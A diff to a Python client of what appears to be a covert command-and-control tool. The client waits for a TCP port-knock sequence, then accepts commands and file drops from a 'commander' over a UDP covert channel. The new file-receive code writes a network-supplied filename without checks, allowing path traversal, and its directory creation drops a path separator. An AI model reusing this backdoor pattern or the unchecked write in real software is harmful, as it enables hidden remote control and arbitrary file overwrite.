@@ -20,6 +20,7 @@ import threading
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
 KNOCK_TIMEOUT = 10  # Seconds to complete knock
 COMMAND_PORT = 8888  # UDP port for covert channel (after knocking)
+TMP_DIR = "client_files/"  # directory for files transferred from commander to client
 
 
 class CommandType(IntEnum):
@@ -342,18 +343,29 @@ class Client:
             print("[*] Processing TRANSFER_TO_CLIENT")
             # Payload format: filename|filedata
             try:
-                payload_str = payload.decode('utf-8', errors='ignore')
-                if '|' in payload_str:
-                    filename, filedata = payload_str.split('|', 1)
-                    print(f"    Receiving file: {filename}")
-                    print(f"    Size: {len(filedata)} bytes")
-                    # Write file to /tmp
-                    filepath = f"/tmp/{filename}"
-                    with open(filepath, 'w') as f:
-                        f.write(filedata)
-                    print(f"    File saved to: {filepath}")
-                else:
+                if len(payload) < 2:
                     print("    Error: Invalid payload format")
+                    return
+
+                # Extract filename length (first 2 bytes)
+                filename_length = struct.unpack('!H', payload[:2])[0]
+
+                # Extract filename
+                filename = payload[2:2 + filename_length].decode('utf-8')
+
+                # Extract file data (remaining bytes)
+                filedata = payload[2 + filename_length:]
+
+                print(f"    Receiving file: {filename}")
+                print(f"    Size: {len(filedata)} bytes")
+
+                # Write file to /tmp as raw bytes
+                filepath = os.path.join(os.getcwd(), TMP_DIR, filename)
+                print(filepath)
+                with open(filepath, 'wb') as f:
+                    f.write(filedata)
+                print(f"    File saved to: {filepath}")
+
             except Exception as e:
                 print(f"    Error: {e}")
 
@@ -426,6 +438,10 @@ class Client:
         print(f"Command port: UDP {self.command_port}")
         print("=" * 60)
         print()
+
+        if not os.path.exists(os.path.join(os.getcwd(),TMP_DIR)):
+            print("temp directory created \n")
+            os.makedirs(os.getcwd() + TMP_DIR)
 
         # Start knock listeners
         for port in self.knock_ports:
